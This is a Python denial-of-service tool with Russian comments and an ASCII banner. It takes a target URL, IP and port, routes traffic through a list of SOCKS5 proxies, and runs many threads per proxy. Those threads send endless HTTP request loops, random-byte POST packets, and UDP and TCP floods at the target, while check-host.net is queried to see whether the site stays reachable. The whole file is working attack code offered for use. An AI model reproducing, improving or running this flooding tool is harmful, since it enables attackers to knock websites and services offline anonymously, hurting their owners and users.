import requests
import socks
import socket
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Функция для вывода ASCII-арт сообщения
def print_ascii_art():
    print("""
████████╗███████╗██████╗░░█████╗░███╗░░██╗██╗██╗░░░░░░██╗░░░░░██╗██╗░░░░░██╗████████╗██╗░░██╗███████╗
╚══██╔══╝██╔════╝██╔══██╗██╔══██╗████╗░██║██║██║░░░░░░██║░░░░░██║██║░░░░░██║╚══██╔══╝██║░░██║██╔════╝
░░░██║░░░█████╗░░██████╔╝███████║██╔██╗██║██║██║█████╗██║░░░░░██║██║░░░░░██║░░░██║░░░███████║█████╗░░
░░░██║░░░██╔══╝░░██╔══██╗██╔══██║██║╚████║██║██║╚════╝██║░░░░░██║██║░░░░░██║░░░██║░░░██╔══██║██╔══╝░░
░░░██║░░░███████╗██║░░██║██║░░██║██║░╚███║██║██║░░░░░░███████╗██║███████╗██║░░░██║░░░██║░░██║██║░░░░░
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝╚═╝░░░░░░╚══════╝╚═╝╚══════╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░
    """)

# Функция для чтения прокси из файла
def load_proxies(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

# Функция для генерации случайного HEX пакета
def random_hex_packet(length):
    return bytes(random.getrandbits(8) for _ in range(length))

# Функция для генерации случайного DYN пакета
def random_dyn_packet(length):
    return bytes(random.getrandbits(8) for _ in range(length))

# Функция для отправки HTTP пакета со старшим байтом
def send_http_packet_with_high_byte(url, proxy):
    proxy_ip, proxy_port = proxy.split(':')
    proxies_dict = {
        'http': f'socks5://{proxy_ip}:{proxy_port}',
        'https': f'socks5://{proxy_ip}:{proxy_port}'
    }
    try:
        high_byte_packet = b'\xFF' + random_hex_packet(1024)
        response = requests.post(url, proxies=proxies_dict, data=high_byte_packet)
        print(f'Proxy: {proxy}, HTTP Packet Status Code: {response.status_code}')
    except Exception as e:
        print(f'Proxy: {proxy}, HTTP Packet Error: {e}')

# Функция для отправки HTTP запросов через прокси
def send_http_requests(url, proxy):
    proxy_ip, proxy_port = proxy.split(':')
    proxies_dict = {
        'http': f'socks5://{proxy_ip}:{proxy_port}',
        'https': f'socks5://{proxy_ip}:{proxy_port}'
    }
    try:
        while True:  # Запускаем бесконечный цикл запросов
            response_get = requests.get(url, proxies=proxies_dict)
            response_post = requests.post(url, proxies=proxies_dict, data={'key': 'value'})
            response_put = requests.put(url, proxies=proxies_dict, data={'key': 'value'})
            response_delete = requests.delete(url, proxies=proxies_dict)
            print(f'Proxy: {proxy}, GET Status Code: {response_get.status_code}')
            print(f'Proxy: {proxy}, POST Status Code: {response_post.status_code}')
            print(f'Proxy: {proxy}, PUT Status Code: {response_put.status_code}')
            print(f'Proxy: {proxy}, DELETE Status Code: {response_delete.status_code}')
    except Exception as e:
        print(f'Proxy: {proxy}, HTTP Error: {e}')

# Функция для выполнения UDP Flood
def udp_flood(ip, port, delay, proxy):
    proxy_ip, proxy_port = proxy.split(':')
    socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    socket.socket = socks.socksocket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(random_hex_packet(1024), (ip, port))
            time.sleep(delay)
        except Exception as e:
            print(f'Proxy: {proxy}, UDP Flood Error: {e}')

# Функция для выполнения TCP Flood
def tcp_flood(ip, port, delay, proxy):
    proxy_ip, proxy_port = proxy.split(':')
    socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    socket.socket = socks.socksocket
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(random_dyn_packet(1024))
            sock.close()
            time.sleep(delay)
        except Exception as e:
            print(f'Proxy: {proxy}, TCP Flood Error: {e}')

# Функция для отправки запросов на проверку через check-host.net
def send_check_host_requests(url):
    endpoints = [
        'check-ping', 'check-http', 'check-tcp', 'check-dns'
    ]
    for endpoint in endpoints:
        full_url = f'https://check-host.net/{endpoint}?host={url}&max_nodes=52'
        try:
            response = requests.get(full_url)
            print(f'{endpoint} response: {response.status_code}')
        except Exception as e:
            print(f'{endpoint} Error: {e}')

# Функция для выполнения множества GET запросов
def bombard_site(url, proxy, num_requests):
    for _ in range(num_requests):
        send_http_requests(url, proxy)

# Главная функция
def main():
    print_ascii_art()
    url = input('Введите URL: ')
    ip = input('Введите IP: ')
    port = int(input('Введите порт: '))
    delay = float(input('Введите задержку между запросами (в секундах): '))

    proxies = load_proxies('socks5.txt')

    num_threads = len(proxies) * 10  # Увеличиваем количество потоков для масштабируемости
    num_requests = 100  # Количество GET запросов на сайт в каждом потоке

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for proxy in proxies:
            # Запускаем потоки для HTTP запросов
            for _ in range(10):  # 10 потоков на каждый прокси
                futures.append(executor.submit(bombard_site, url, proxy, num_requests))
                futures.append(executor.submit(send_http_packet_with_high_byte, url, proxy))
                futures.append(executor.submit(udp_flood, ip, port, delay, proxy))
                futures.append(executor.submit(tcp_flood, ip, port, delay, proxy))

        # Запускаем запросы на проверку через check-host.net
        futures.append(executor.submit(send_check_host_requests, url))

        # Ожидаем завершения всех потоков
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f'Error in thread: {e}')

if __name__ == '__main__':
    main()
